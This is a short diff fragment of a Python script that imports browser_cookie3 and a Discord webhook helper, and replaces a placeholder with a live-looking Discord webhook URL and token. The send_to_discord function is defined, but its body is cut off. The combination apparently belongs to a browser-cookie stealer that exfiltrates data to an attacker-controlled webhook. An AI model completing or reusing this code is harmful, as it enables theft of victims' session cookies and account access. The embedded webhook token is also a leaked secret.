@@ -5,8 +5,8 @@ import platform
 from discord import Webhook
 import browser_cookie3
 
-# Your Discord webhook URL
-webhook_url = 'YOUR_WEBHOOK_URL'  # Replace this with your actual webhook URL
+# Your specific Discord webhook URL
+webhook_url = 'https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp'
 
 # Function to send data to the Discord webhook
 def send_to_discord(content):
